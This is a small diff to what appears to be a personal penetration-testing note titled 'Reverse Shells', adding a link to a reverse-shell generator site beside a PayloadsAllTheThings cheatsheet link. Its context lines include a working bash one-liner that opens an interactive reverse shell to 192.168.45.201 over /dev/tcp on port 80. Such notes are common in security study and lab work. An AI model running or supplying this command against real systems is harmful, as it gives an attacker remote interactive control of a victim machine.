@@ -3,6 +3,7 @@ sticker: emoji//1f41a
 ---
 ### Reverse Shells
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python
+https://www.revshells.com/
 ##### Bash
 ```
 bash -c "bash -i >& /dev/tcp/192.168.45.201/80 0>&1"
